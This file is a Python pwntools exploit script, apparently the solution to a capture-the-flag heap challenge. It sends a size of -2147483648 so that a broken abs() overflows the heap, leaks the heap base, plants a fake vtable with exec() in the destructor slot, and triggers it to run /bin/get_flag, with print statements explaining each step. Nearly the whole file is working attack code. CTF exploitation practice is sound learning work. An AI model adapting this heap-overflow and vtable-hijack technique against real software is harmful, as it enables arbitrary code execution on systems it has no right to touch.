#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13726
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


verbose_mode = False


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    str1 = b"AAAAAAA\n"
    print(f"(-) Adding String1 of size 8: {str1}")
    add(proc, 8, str1)

    str2 = b"BBBBBBB\n"
    print(f"(-) Adding String2 of size 8: {str2}")
    add(proc, 8, str2)

    str3 = b"CCCCCCC\n"
    print(f"(-) Adding String3 of size 8: {str3}")
    add(proc, 8, str3)

    print("(-) Freeing first String.")
    delete(proc, 1)

    print("(-) Adding another String using 0xFFFFFFFF (most negative integer) as size.")
    print("    This abuses the fact that abs() is not properly defined for this input.")
    print("    This allows us to overflow on the heap.")
    print("    The new String is be allocated in place of String1, which we just freed.")
    print("    We use this to write the chunk containing the data structure (not data!) of String2.")
    print("    Shifting pointer to data of String2 using single NULL byte overflow into its address.")
    print("    This then allows for the leak of pointers from the memory before the chunk.")
    add(proc, -2147483648, 0x100*b"A" + p64(0x00) + p64(0x21) + p64(0x405090) + b"\n")

    print("(-) Printing content of strings.")
    resp = show(proc)[2]
    heap_leak_raw = resp[18*8:19*8]
    addr_heap_base = int.from_bytes(heap_leak_raw, 'little') - 0x11eb0
    print(f"(-) Successfully retrieved heap base address: {addr_heap_base:#0{0}18x}")

    print("(-) Freeing chunk we just allocated.")
    delete(proc, 3)


    addr_heap_strA = addr_heap_base + 0x12F40
    addr_vuln_typinfo_string = 0x4050e8
    addr_vuln_string_exec = 0x402332
    print("(-) Calculated Addresses:")
    print(f"    - typeinfo struct of string: {addr_vuln_typinfo_string:#0{0}18x}")
    print(f"    - exec function of string: {addr_vuln_string_exec:#0{0}18x}")
    print(f"    - address of String1 on heap: {addr_heap_strA:#0{0}18x}")


    fake_vatble = p64(0x0) + p64(addr_vuln_typinfo_string) + p64(addr_vuln_string_exec) + p64(addr_vuln_string_exec)
    print(f"(-) Creadted fake vtable with exec() in place of destructor:")
    print(f"    {fake_vatble}")

    str_bin_get_flag = b"/bin/get_flag"
    str_bin_get_flag_padded = str_bin_get_flag + (16 - (len(str_bin_get_flag)%16))*b"\x00"
    print(f"Crafted binary path string: {str_bin_get_flag_padded}")

    addr_heap_fake_vtable = addr_heap_strA + 16
    addr_heap_str_bin_get_flag = addr_heap_strA + len(fake_vatble)
    print("(-) Calculated Addresses:")
    print(f"    - fake vtable on heap: {addr_heap_fake_vtable:#0{0}18x}")
    print(f"    - binary path string on heap: {addr_heap_str_bin_get_flag:#0{0}18x}")

    content_heap_strA  = b""
    content_heap_strA += fake_vatble
    content_heap_strA += str_bin_get_flag_padded
    content_heap_strA += (0x100 - (len(fake_vatble) + len(str_bin_get_flag_padded))) * b"\x00"
    content_heap_strA += p64(0x0)
    content_heap_strA += p64(0x21)
    content_heap_strA += p64(addr_heap_fake_vtable)
    content_heap_strA += p64(addr_heap_str_bin_get_flag)
    content_heap_strA += p64(len(str_bin_get_flag) + 1)

    print("(-) Placing fake vtable within new string allocated in place of String1.")
    print("    Overflowing into String2 to:")
    print("    - point vtable to fake vtable on heap")
    print("    - point string to binary path string on heap.")
    add(proc, -2147483648, content_heap_strA + b"\n")

    print("(-) Freeing String we just allocated to trigger exec() via fake vtable entry of destructor.")
    flag = delete(proc, 2)

    if b"flag" in flag:
        print(f"(-) Successfully rerieved flag: {flag.decode()}")
    else:
        print("(-) Something went wrong retrieving the flag...")

    proc.close()
    return


def quit(target, verbose=verbose_mode):
    if verbose: print("quit")
    target.write(b"quit\n")

def show(target, verbose=verbose_mode):
    if verbose: print("show:")
    target.write(b"show\n")
    raw = []
    while True:
        line = target.readline()
        if b"ok" in line: break
        if verbose: print(line)
        raw.append(line)
    return raw

def add(target, n, raw, verbose=verbose_mode, newline_terminate_string=True):
    if verbose: print(f"add {n} bytes: {raw}")
    target.write(b"add\n")
    target.write(str(n).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)

def edit(target, i, raw, verbose=verbose_mode, newline_terminate_string=True):
    if verbose: print(f"edit string at index {i}: {raw}")
    target.write(b"edit\n")
    target.write(str(i).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)

def delete(target, i, verbose=verbose_mode):
    if verbose: print(f"\"delete\" string at index {i}")
    target.write(b"delete\n")
    target.write(str(i).encode()+b"\n")
    response = target.readuntil(b"\n")
    if verbose: print(response)
    return response


#Invoke the exploit when the script is executed.
exploit()


